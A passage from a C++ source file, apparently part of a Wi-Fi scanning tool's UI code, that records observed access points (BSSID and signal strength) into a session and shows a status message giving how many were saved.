        sessions->record_observation(created.value().id, ObservationType::WifiAp, ap.bssid, ap.rssi,
                                     meta);
        ++saved;
    }

    char status[96];
    std::snprintf(status, sizeof(status), "Saved %d access points to \"%s\".",
                  static_cast<int>(saved), name);
    self->set_status(status);
#endif
    self->resume_timer();
}

}  // namespace spectra5::ui
